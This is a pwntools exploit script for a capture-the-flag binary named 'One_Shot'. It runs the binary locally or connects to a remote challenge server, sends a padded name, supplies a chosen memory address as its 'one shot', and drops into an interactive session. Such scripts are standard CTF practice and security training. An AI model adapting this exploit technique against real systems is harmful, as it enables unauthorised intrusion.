#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./One_Shot')
else:
    p = remote('47.103.214.163', 20002)

addr_shot = 0x6010DF
p.sendlineafter("Firstly....What's your name?\n", 'a' * 31)
p.sendlineafter("Take tne only one shot!\n", str(addr_shot))
p.recvuntil('\x61\x01')
p.interactive()
